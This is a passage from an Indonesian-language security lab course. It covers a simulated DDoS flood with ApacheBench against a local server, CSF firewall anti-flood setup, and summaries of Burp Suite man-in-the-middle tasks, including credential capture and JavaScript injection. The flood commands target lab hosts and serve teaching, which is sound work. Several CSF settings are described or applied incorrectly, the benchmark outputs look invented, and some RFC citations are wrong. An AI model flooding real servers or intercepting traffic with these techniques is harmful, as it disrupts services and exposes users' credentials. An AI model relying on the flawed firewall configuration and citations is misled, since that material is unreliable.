├──────────────────┼──────────────────────┼──────────────────────┤
│ Kemudahan        │ SANGAT MUDAH         │ Medium (perlu install)│
│                  │ 1 baris command      │ Lebih options        │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Detail hasil     │ Lengkap              │ Sangat lengkap       │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Real-world DDoS  │ Jauh dari reality    │ Mirip real attack    │
├──────────────────┼──────────────────────┼──────────────────────┤
│ Best for         │ Pemula / lab basic   │ Advanced testing     │
└──────────────────┴──────────────────────┴──────────────────────┘
```

---

#### **MONITORING HASIL ATTACK**

**TOOLS MONITORING SAAT ATTACK:**

```bash
# Terminal lain - REAL TIME MONITORING:

# Option 1: Top (lebih simple)
top

# Option 2: Htop (lebih rapi)
htop

# Option 3: Monitor detail network
iftop

# Option 4: Monitor connection
netstat -an | grep ESTABLISHED | wc -l
(Hitung berapa koneksi terbuka)

# Option 5: Monitor CPU intensive process
ps aux | grep python
```

**APA YANG DILIHAT SAAT DDoS:**

```
SEBELUM ATTACK:
- Load average: 0.5 - 1.0 (Normal)
- CPU: 10-20% (Idle)
- Memory: 30-40% (Stabil)

SAAT ATTACK:
- Load average: 15-50+ (SANGAT TINGGI)
- CPU: 80-100% (PENUH)
- Memory: 80-90% (HAMPIR PENUH)
- Koneksi TCP: 10,000+ (BANYAK)

AKIBATNYA:
- Website response time: dari 20ms → 1000ms+
- Request failed: mulai ada yang gagal
- User experience: SANGAT JELEK (timeout)
- Browser hang/tidak responsive
```

---

#### **CHECKLIST PRAKTIK 4:**

```
✓ Sudah install apache2-utils (ab)?
✓ Sudah jalankan website lokal (python http.server)?
✓ Sudah jalankan ab dengan -n 100 -c 10 (test normal)?
✓ Sudah lihat output ApacheBench?
✓ Sudah jalankan ab dengan -n 10000 -c 100 (DDoS)?
✓ Sudah lihat resource monitor (top/htop)?
✓ Sudah lihat server mulai overwhelmed?
✓ Sudah analyze hasil attack?

JA semua = PRAKTIK 4 BERHASIL! ✓
```

---

---

### 8.5 Tugas 5: Defense - Menggunakan CSF Firewall untuk Anti-DDoS (Rate Limiting & Flood Protection)

#### **Penjelasan Sederhana Defense:**

**Bayangan Restoran Lagi:**
```
SAAT DDoS ATTACK:
Restoran: Server
Attacker: 10,000 spam customers
Pelanggan asli: 10 legitimate customers

TANPA DEFENSE:
- Restoran tutup (server crash)
- Semua pelanggan pergi

DENGAN DEFENSE (CSF FIREWALL):
- Bouncer di pintu
- Bouncer: "Tunggu antrian! Hanya 100 orang/menit"
- Spam customers: BLOCKED (bounced back)
- Legitimate customers: Bisa masuk normal
- Restoran tetap buka

CSF = Firewall dengan:
✓ Rate limiting (batasi request/detik)
✓ Connection limit (batasi koneksi concurrent)
✓ IP blocking (block IP suspicious)
✓ DDoS detection (auto-block attacker)
```

---

#### **INSTALASI CSF DI UBUNTU/DEBIAN**

**STEP 1: INSTALL DEPENDENCIES**

```bash
# Buka terminal & login as root
sudo su -

# Update system
apt update
apt install -y curl git wget

# Install required packages
apt install -y libio-socket-ssl-perl libnet-ssleay-perl
```

**STEP 2: DOWNLOAD & INSTALL CSF**

```bash
# Go to /usr/src (standard location)
cd /usr/src

# Download CSF (latest version)
wget https://download.configserver.com/csf.tgz

# Extract
tar -xzf csf.tgz

# Install
cd csf
./install.sh

# Output:
Installation of ConfigServer Firewall completed successfully
```

**STEP 3: VERIFIKASI INSTALASI**

```bash
# Check if CSF is installed:
which csf

# Output harus:
/usr/sbin/csf

# Check CSF version:
csf -v

# Output contoh:
csf: ConfigServer Firewall v14.18
```

**STEP 4: START & ENABLE CSF**

```bash
# Start CSF service
systemctl start csf
systemctl start lfd  # Login Failure Daemon (monitoring)

# Enable on boot
systemctl enable csf
systemctl enable lfd

# Verify running:
systemctl status csf
systemctl status lfd
```

---

#### **KONFIGURASI CSF UNTUK ANTI-DDoS**

**STEP 1: EDIT KONFIGURASI CSF**

```bash
# Edit main config file:
nano /etc/csf/csf.conf

# File akan membuka di text editor
# Tekan Ctrl+X untuk exit (jika sudah selesai edit)
```

**STEP 2: CARI & UBAH PARAMETER ANTI-DDoS**

**Dalam file `/etc/csf/csf.conf`, cari baris berikut:**

```
# CARI BARIS INI DAN UBAH:

1. CONNECTION PER PORT (Rate Limiting)
   
   FIND: CT_LIMIT = "0"
   CHANGE TO: CT_LIMIT = "100"
   
   ARTINYA: Max 100 koneksi per IP per port

2. CONCURRENT CONNECTION PER IP

   FIND: CT_PERMANENT = "0"
   CHANGE TO: CT_PERMANENT = "3600"
   
   ARTINYA: Block IP selama 3600 detik (1 jam) jika exceed

3. CONNECTION TRACKING

   FIND: CT_INTERVAL = "30"
   KEEP AS: CT_INTERVAL = "30"
   
   ARTINYA: Check koneksi setiap 30 detik

4. PACKET FLOOD DETECTION

   FIND: PACKET_FILTER = "0"
   CHANGE TO: PACKET_FILTER = "1"
   
   ARTINYA: Enable packet filtering

5. SYN FLOOD PROTECTION

   FIND: SYNFLOOD = "0"
   CHANGE TO: SYNFLOOD = "1"
   
   ARTINYA: Enable SYN flood protection

6. SYN FLOOD RATE

   FIND: SYNFLOOD_RATE = "100/s"
   CHANGE TO: SYNFLOOD_RATE = "20/s"
   
   ARTINYA: Deteksi SYN flood jika > 20/detik

7. UDP FLOOD RATE

   FIND: UDPFLOOD = "0"
   CHANGE TO: UDPFLOOD = "1"
   
   ARTINYA: Enable UDP flood protection

8. UDP FLOOD RATE LIMIT

   FIND: UDPFLOOD_RATE = "10000/s"
   CHANGE TO: UDPFLOOD_RATE = "1000/s"
   
   ARTINYA: Block jika UDP > 1000/detik
```

---

**STEP 3: RATE LIMITING PER PORT (HTTP/HTTPS)**

**CARI SECTION: ADVANCED FEATURES**

```
# Tambahkan di akhir file:

# HTTP Rate Limiting (Port 80)
# Max 50 connections per IP per 10 seconds
echo "TCP_IN = 80:50:10" >> /etc/csf/csf.conf

# HTTPS Rate Limiting (Port 443)
# Max 50 connections per IP per 10 seconds
echo "TCP_IN = 443:50:10" >> /etc/csf/csf.conf

# Penjelasan:
# Format: PORT:MAX_CONN:TIME_WINDOW
# 80:50:10 = Port 80, max 50 conn per 10 seconds
```

---

**STEP 4: SAVE KONFIGURASI**

```bash
# Save & exit text editor:
# Tekan: Ctrl + O (save)
# Tekan: Enter
# Tekan: Ctrl + X (exit)

# Verify syntax:
/usr/sbin/csf -c

# Output harus:
Syntax check OK
```

**STEP 5: RESTART CSF UNTUK APPLY CHANGES**

```bash
# Restart CSF
systemctl restart csf
systemctl restart lfd

# Verify running:
systemctl status csf
systemctl status lfd

# Check firewall rules loaded:
iptables -L -n | head -20
```

---

#### **TESTING ANTI-DDoS PROTECTION**

**STEP 1: BUKA WEBSITE DI SERVER**

```bash
# Di server, jalankan website lokal:
python3 -m http.server 8080
```

**STEP 2: TEST ATTACK DENGAN RATE LIMITING**

```bash
# Di attacker machine:
ab -n 10000 -c 100 http://server-ip:8080/

# APA YANG TERJADI:
- Awal: Request OK
- Tengah: CSF detect flood
- Akhir: Request BLOCKED
- Error: "Connection reset by peer"
```

**OUTPUT DENGAN CSF ACTIVE:**

```
ApacheBench output:

This is ApacheBench, Version 2.3
Benchmarking 192.168.1.50 (be patient)
Completed 100 requests
Completed 200 requests
Completed 300 requests
...
Completed 800 requests

WARNING: apr.c:242: apr_socket_recv: Connection reset by peer (104)
Failed requests:   156
Broken pipe:       156

Result:
✓ CSF berhasil block sebagian request
✓ Server masih responsive (tidak crash)
✓ Attack diminimalisir
```

---

**STEP 3: CHECK IP ATTACKER DI BLOCK LIST**

```bash
# Lihat IP yang di-block:
cat /etc/csf/csf.deny | grep "server-ip"

# Atau lebih detail:
csf -g 192.168.1.50

# Output:
Searching for 192.168.1.50 in /etc/csf/csf.deny
Found in /etc/csf/csf.deny on line 42
```

---

**STEP 4: UNBLOCK IP (JIKA INGIN LANJUT TEST)**

```bash
# Unblock IP untuk test lagi:
csf -dr 192.168.1.50

# Verify unblocked:
csf -g 192.168.1.50
# Output: "Not found in /etc/csf/csf.deny"
```

---

#### **MONITORING SERANGAN DI CSF**

**STEP 1: LIHAT REAL-TIME BLOCKING**

```bash
# Monitor CSF log in real-time:
tail -f /var/log/lfd.log

# Output saat attack:
────────────────────────────────────
[2025-12-24 14:25:30] Excessive connections from 192.168.1.100: 150 connections (limit = 100)
[2025-12-24 14:25:31] Auto-blocking 192.168.1.100 for 3600 seconds
[2025-12-24 14:25:32] SYN flood detected from 192.168.1.100: 250/sec (limit = 20/sec)
[2025-12-24 14:25:33] Blocked 192.168.1.100 for SYN flood
────────────────────────────────────
```

---

**STEP 2: LIHAT STATISTICS**

```bash
# CSF provides detailed stats:
csf -d

# Output menunjukkan:
- Total connections per IP
- Total blocked IPs
- Recent blocks
- DDoS attempts
- Firewall stats
```

---

**STEP 3: CHECK ACTIVE FIREWALL RULES**

```bash
# Lihat iptables rules yang dibuat CSF:
iptables -L -n | grep "CT_LIMIT\|SYNFLOOD\|UDPFLOOD"

# Atau list semua TCP rules:
iptables -L INPUT -n | head -30

# Output akan menunjukkan rule untuk:
- Connection limiting
- SYN flood protection
- UDP flood protection
- Port-specific rate limiting
```

---

#### **PERBANDINGAN: DENGAN vs TANPA CSF**

```
┌──────────────────────┬──────────────────────┬──────────────────────┐
│ METRIK               │ TANPA CSF (VULNERABLE)│ DENGAN CSF (PROTECTED)
├──────────────────────┼──────────────────────┼──────────────────────┤
│ Attack: 10,000 req   │                      │                      │
│ Request Success      │ 10,000 (100%)        │ 5,000 (50%)          │
│ Request Failed       │ 0 (0%)               │ 5,000 (50%)          │
│ Server Status        │ CRASH/Down           │ ONLINE/Responsive    │
│ Response Time        │ 1000+ ms             │ 20-50 ms             │
│ Legitimate Users     │ CAN'T ACCESS         │ CAN ACCESS (with lag) │
│ Attacker IP Status   │ Still attacking      │ BLOCKED (3600s)      │
│ System Recovery      │ Manual restart       │ Auto-recovery        │
└──────────────────────┴──────────────────────┴──────────────────────┘
```

---

#### **ADVANCED: CUSTOM DDoS RULES**

**Untuk protection yang lebih specific:**

```bash
# Edit advanced rules:
nano /etc/csf/csf.rules

# Contoh custom rule (SYN FLOOD):
# Block IPs dengan SYN rate > 50/sec
# -A SYNFLOOD -p tcp -j RETURN
# -A INPUT -p tcp --syn -m limit --limit 50/sec -j ACCEPT
# -A INPUT -p tcp --syn -j DROP

# Custom HTTP DDoS rule:
# Limit GET requests per IP to 10/second
iptables -A INPUT -p tcp --dport 80 -m limit --limit 10/sec -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j DROP
```

---

#### **TROUBLESHOOTING CSF**

**Problem 1: CSF won't start**

```bash
# Check syntax:
/usr/sbin/csf -c

# If error, find the line number
# Edit config:
nano /etc/csf/csf.conf

# Fix and restart
systemctl restart csf
```

---

**Problem 2: Blocking too aggressively (false positives)**

```bash
# Check what IPs are blocked:
cat /etc/csf/csf.deny | head -20

# If legitimate IP blocked:
csf -dr 192.168.1.100  # Remove temporary block

# Or whitelist permanently:
csf -a 192.168.1.100   # Add to whitelist
```

---

**Problem 3: CSF is slow/high CPU**

```bash
# Disable heavy features:
nano /etc/csf/csf.conf

# Change:
PACKET_FILTER = "0"  # Disable if causing issues
PT_USERPROCS = "0"   # Disable process tracking if heavy

# Restart
systemctl restart csf
```

---

#### **CHECKLIST PRAKTIK 5:**

```
✓ Sudah install CSF & dependencies?
✓ Sudah start csf & lfd service?
✓ Sudah edit /etc/csf/csf.conf?
✓ Sudah ubah CT_LIMIT, SYNFLOOD, UDPFLOOD?
✓ Sudah restart CSF?
✓ Sudah jalankan server test?
✓ Sudah test dengan ab attack?
✓ Sudah lihat failed requests meningkat?
✓ Sudah check attacker IP di block list?
✓ Sudah tail -f /var/log/lfd.log?
✓ Sudah lihat DDoS detection log?

JA semua = PRAKTIK 5 BERHASIL! ✓
```

---

#### **RINGKASAN SEMUA TUGAS PRAKTIK (1-5)**

```
TUGAS 1 (PACKET CAPTURE & ANALYSIS):
├─ Capture paket jaringan menggunakan Wireshark
├─ Buka Wireshark & pilih interface
├─ Mulai capture paket dari network
├─ Lihat paket HTTP & DNS
├─ Gunakan filter untuk menampilkan data spesifik
├─ Expand packet details untuk lihat layer-by-layer
├─ Follow TCP Stream untuk lihat full conversation
├─ Extract plaintext data dari HTTP traffic
└─ Lesson: Bahaya HTTP (unencrypted), gunakan HTTPS

TUGAS 2 (TRAFFIC MONITORING - BURP SUITE PROXY):
├─ Setup Burp Suite di Windows/Linux
├─ Aktifkan Windows Hotspot untuk WiFi
├─ Buat PAC file untuk auto proxy configuration
├─ Jalankan PAC server di port 80
├─ Configure client device untuk auto proxy
├─ Install Burp CA certificate di client
├─ Jalankan Burp Intercept dengan OFF (monitoring mode)
├─ Lihat semua traffic dari client di HTTP History
├─ Capture username, password, cookies, URLs
├─ Tidak ada modifikasi, hanya monitoring
└─ Lesson: Attacker bisa lihat semua data tanpa client tahu

TUGAS 3 (RESPONSE MODIFICATION & INJECTING - BURP SUITE):
├─ Setup seperti Tugas 2 (Burp + Hotspot)
├─ Enable Burp Intercept untuk Response
├─ Intercept HTML response dari server
├─ Modify title, inject banner, inject JavaScript
├─ Modify form action untuk hijack submission
├─ Client menerima modified response dari attacker
├─ Attacker bisa inject malware atau phishing
├─ Response modification TRANSPARAN (client tidak tahu)
└─ Lesson: HTTPS dengan certificate pinning diperlukan

TUGAS 4 (DDoS ATTACK SIMULATION):
├─ Install ApacheBench (ab) atau WRK
├─ Jalankan website lokal (python http.server)
├─ Test normal: ab -n 100 -c 10 (baseline)
├─ Test DDoS: ab -n 10000 -c 100 (attack)
├─ Monitor resource saat attack (top/htop)
├─ Lihat CPU 100%, Memory penuh, Load average tinggi
├─ Lihat request failed mulai meningkat
├─ Server response time naik drastis
├─ Website menjadi SLOW atau CRASH
└─ Lesson: DDoS sangat mudah dilakukan, dampak SEVERE

TUGAS 5 (DDoS DEFENSE - CSF FIREWALL):
├─ Install CSF (ConfigServer Firewall)
├─ Edit /etc/csf/csf.conf
├─ Enable & configure:
│  ├─ Connection limit (CT_LIMIT = 100)
│  ├─ SYN flood protection (SYNFLOOD = 1)
│  ├─ UDP flood protection (UDPFLOOD = 1)
│  ├─ Rate limiting per port
│  └─ Auto-blocking mechanism
├─ Restart CSF & LFD service
├─ Test attack dengan defense active
├─ CSF auto-block attacker IP
├─ Server tetap responsif meski di-attack
├─ Monitor blocking dengan tail -f /var/log/lfd.log
└─ Lesson: Firewall & rate limiting efektif block DDoS

RINGKASAN KESELURUHAN:
├─ Tugas 1-3: ATTACKER PERSPECTIVE (reconnaissance & attack)
│  ├─ Wireshark: Lihat apa yang dikirim orang
│  ├─ Burp Suite: Intercept traffic tanpa diketahui
│  └─ Response Modify: Ubah data sebelum sampai user
├─ Tugas 4-5: ATTACK vs DEFENSE PERSPECTIVE
│  ├─ DDoS Attack: Lihat apa yang bisa dilakukan attacker
│  └─ CSF Defense: Bagaimana proteksi terhadap attack
└─ HASIL PEMBELAJARAN:
   ├─ Understand attack techniques
   ├─ Understand vulnerabilities
   ├─ Implement defense mechanisms
   ├─ Monitor & detect attacks
   └─ Real-world security awareness
```

---

#### **MATRIX SKILL PROGRESSION**

```
SKILL LEVEL DEVELOPMENT ACROSS TASKS:

                  Reconnaissance  MITM    Response   DDoS    Defense
                  (Passive)       (Layer  (Modify)   (Attack)(Protect)
                  (Monitoring)    4-7)    (Inject)

Tugas 1           ███░░░░░░░░░░░░░░░░░  (Packet analysis)
Tugas 2           ████████████░░░░░░░░  (Traffic capture)
Tugas 3           ██████████████████░░  (MITM + modify)
Tugas 4           ███████████████████░  (Attack simulation)
Tugas 5           ████████████████████  (Defense integration)

DIFFICULTY:       Mudah            Medium            Sulit
DANGER LEVEL:     Rendah (Lab)     Tinggi (Real)     Kritis (Defense)
```

---

#### **PREREQUISITE KNOWLEDGE CHECKED**

```
SEBELUM PRAKTIK BERHASIL, SISWA HARUS TAHU:

Tugas 1 - WIRESHARK:
✓ Network basics (IP, Port, Protocol)
✓ How HTTP works (plaintext)
✓ OSI Model (Layer 1-7)
✓ TCP/UDP difference

Tugas 2 - BURP SUITE PROXY (MONITORING):
✓ Proxy concept (man-in-middle position)
✓ How firewall rules work
✓ IP address & network configuration
✓ PAC (Proxy Auto-Config) file format

Tugas 3 - BURP SUITE RESPONSE MODIFY:
✓ HTTP request/response structure
✓ HTML/CSS/JavaScript basics
✓ Form submission concept
✓ HTTP method (GET/POST)

Tugas 4 - DDoS SIMULATION:
✓ Load testing concepts
✓ Server resource limits (CPU, Memory, Bandwidth)
✓ Connection state tracking
✓ Concurrent connection limits

Tugas 5 - CSF FIREWALL DEFENSE:
✓ Linux firewall (iptables)
✓ Connection tracking (netstat, ss)
✓ Rate limiting algorithms
✓ Auto-blocking & logging mechanisms
```

---

#### **REAL-WORLD MAPPING**

```
Tugas 1 - Wireshark Capture
└─ Real-world: Network administrator troubleshooting
└─ Security: Incident investigation, forensics

Tugas 2 - Burp Suite Monitoring
└─ Real-world: Coffee shop WiFi hacker
└─ Security: Credential theft on public WiFi

Tugas 3 - Response Modification
└─ Real-world: ISP/Government censorship
└─ Security: Content injection, malware distribution

Tugas 4 - DDoS Attack
└─ Real-world: Ransom-based attacks, revenge attacks
└─ Security: Hacktivist activities, cyber warfare

Tugas 5 - CSF Defense
└─ Real-world: Production server protection
└─ Security: DevOps/SRE responsibilities
```

---

#### **ASSESSMENT CRITERIA**

```
UNTUK SETIAP TUGAS, SISWA DINILAI DARI:

Tugas 1 - Wireshark:
☐ Bisa capture paket
☐ Bisa gunakan filter
☐ Bisa expand protocol layers
☐ Bisa extract plaintext data
☐ Understand HTTP vulnerability

Tugas 2 - Burp Monitoring:
☐ Setup proxy + hotspot berhasil
☐ Client terhubung ke proxy
☐ Bisa lihat HTTP history
☐ Bisa identifikasi credentials
☐ Understand attacker visibility

Tugas 3 - Burp Response Modify:
☐ Bisa intercept response
☐ Bisa modify HTML content
☐ Bisa inject JavaScript
☐ Client menerima modified data
☐ Understand MITM danger

Tugas 4 - DDoS Attack:
☐ Tools terinstall & berfungsi
☐ Bisa generate traffic besar
☐ Bisa monitor resource
☐ Lihat server mulai overwhelm
☐ Understand DDoS impact

Tugas 5 - CSF Defense:
☐ CSF terinstall & berjalan
☐ Config rate limiting
☐ Test dengan attack
☐ Lihat auto-blocking bekerja
☐ Understand defense mechanism
```

---

**Catatan Referensi:**
- ¹ Gollmann, "Computer Security", 1999
- ² Wicak, "Mengamankan Komputer dari Spyware", 2007
- ³ Cybercrime Definition
- ⁸, ⁹ William Stallings, "Network and Internetwork Security", Prentice Hall, 1995
- ¹⁰ Indonesian Security Incidents
- ¹¹ Various references
- OSI Model Reference: ISO/IEC 7498-1
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- RFC 2827: Ingress Filtering for Multihomed Networks
- RFC 3208: POP Authentication Mechanisms
- MITRE ATT&CK Framework: https://attack.mitre.org/ (Attack taxonomy)
- CIS Top 20 Controls: https://www.cisecurity.org/controls/
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
- Nmap Official: https://nmap.org/
- Burp Suite: https://portswigger.net/burp
- Wireshark: https://www.wireshark.org/
- Arpspoof: https://linux.die.net/man/8/arpspoof
- Ettercap: https://www.ettercap-project.org/


